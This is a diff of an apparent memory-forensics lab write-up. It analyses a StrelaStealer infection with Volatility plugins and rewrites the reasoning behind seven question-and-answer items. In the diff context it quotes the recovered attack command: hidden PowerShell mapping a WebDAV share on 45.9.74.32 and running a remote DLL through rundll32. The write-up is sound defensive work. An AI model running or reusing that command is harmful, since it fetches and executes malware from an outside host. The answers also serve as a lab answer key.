@@ -37,7 +37,7 @@ The output identified the system as Windows 10, showed the NT root as `C:\Window
 
 ### Q1: What is the malicious process?
 
-**Thinking process:** The `windows.malfind` results flag a PowerShell process with PID `3692` as suspicious.
+The `windows.malfind` plugin highlights memory regions that may contain injected or suspicious executable code. Its output points to a PowerShell process with PID `3692`, and the later command-line evidence shows that this process ran a hidden network command. Together, these details identify `powershell.exe` as the malicious process.
 
 **Answer:** `powershell.exe`
 
@@ -49,7 +49,7 @@ python vol.py -f <path_to_memory_dump> windows.malfind
 
 ### Q2: What is the parent PID of the malicious process?
 
-**Thinking process:** The `windows.pstree` output shows PID `3692` linked to parent PID `4210`.
+The `windows.pstree` plugin organizes processes by their parent-child relationships. In the output, the suspicious PowerShell process with PID `3692` is linked to PID `4210` as its parent. Even if the parent process had already ended, the relationship remained available in the captured memory.
 
 **Answer:** `4210`
 
@@ -63,7 +63,7 @@ python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
 
 ### Q3: What filename was used for the second-stage payload?
 
-**Thinking process:** The command passes a remote DLL path to `rundll32`. The filename at the end of that path is the second-stage payload.
+The PowerShell command uses `rundll32` to load a DLL from a remote path. In the command, the final file component before the exported function name `entry` is `3435.dll`. This identifies the filename used for the second-stage payload.
 
 **Answer:** `3435.dll`
 
@@ -75,7 +75,7 @@ powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl
 
 ### Q4: What shared directory was accessed on the remote server?
 
-**Thinking process:** The UNC path places the share name between the remote server and the DLL filename.
+The remote location follows a UNC-style WebDAV path. After the server address and port, the path contains `davwwwroot` before the DLL filename. That section of the path is the shared directory accessed on the remote server.
 
 **Answer:** `davwwwroot`
 
@@ -83,13 +83,13 @@ powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl
 
 ### Q5: What MITRE ATT&CK sub-technique matches this execution method?
 
-**Thinking process:** The command uses the trusted Windows utility `rundll32.exe` to execute a malicious DLL, matching the Rundll32 sub-technique.
+The command does not launch the malicious DLL directly. Instead, it uses the trusted Windows utility `rundll32.exe` to load the remote DLL and call its `entry` function. MITRE ATT&CK classifies this abuse of Rundll32 under Signed Binary Proxy Execution, sub-technique `T1218.011`.
 
 **Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32
 
 ### Q6: Which username ran the malicious process?
 
-**Thinking process:** The `windows.getsids.GetSIDs` results for PID `3692` map the process SID to the user account and show elevated privileges.
+The `windows.getsids.GetSIDs` plugin displays the security identifiers associated with a process. The results for PID `3692` map the process to the user account named `Elon`. They also show administrator membership and a high integrity level, meaning the malicious process was running with elevated access.
 
 **Answer:** `Elon`
 
@@ -101,7 +101,7 @@ python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
 
 ### Q7: What is the malware family?
 
-**Thinking process:** VirusTotal relations for `45.9.74.32` connect the remote infrastructure and related files to an infostealer known for targeting email credentials.
+The PowerShell command provides the remote IP address `45.9.74.32`, which can be used as a threat intelligence pivot. VirusTotal relations connect this address to suspicious DLL files and reporting associated with an infostealer that targets email credentials. Those related indicators identify the malware family as StrelaStealer.
 
 **Answer:** `StrelaStealer`
 
